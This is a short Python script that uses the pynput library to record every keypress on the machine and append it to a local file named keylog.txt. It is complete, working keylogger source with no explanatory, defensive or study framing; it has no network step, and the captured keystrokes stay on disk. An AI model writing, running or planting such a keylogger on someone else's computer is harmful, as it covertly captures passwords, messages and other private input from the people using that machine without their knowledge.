from pynput.keyboard import Listener

def log_key(key):
    key = str(key).replace("'", "")  # Remove single quotes from key names
    with open("keylog.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=log_key) as listener:
    listener.join()
